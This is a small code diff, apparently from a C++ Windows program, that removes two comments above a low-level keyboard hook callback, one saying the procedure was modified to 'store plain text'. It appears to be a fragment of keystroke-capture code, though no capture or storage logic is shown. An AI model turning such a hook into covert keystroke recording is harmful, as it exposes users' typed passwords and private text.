@@ -9,8 +9,6 @@
 std::atomic<bool> g_running(true);
 
 // Callback function for processing keyboard events
-// Modified keyboard hook procedure
-// Modified keyboard proc to store plain text
 LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
